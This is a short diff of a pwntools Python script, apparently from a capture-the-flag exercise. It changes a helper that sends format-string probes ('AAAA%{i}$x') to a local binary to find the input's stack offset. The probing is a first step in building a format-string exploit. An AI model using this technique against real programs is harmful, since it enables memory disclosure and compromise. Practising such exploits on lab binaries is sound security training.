@@ -2,9 +2,9 @@ from pwn import *
 
 context.log_level = 'error'
 
-def find_offset(process, after):
+def find_offset(binary, after):
     for i in range(1, 20):
-        p = process('./chained')
+        p = process(binary)
 
         p.sendlineafter(after, f'AAAA%{i}$x'.encode())
         output = p.recvline().decode('utf-8')
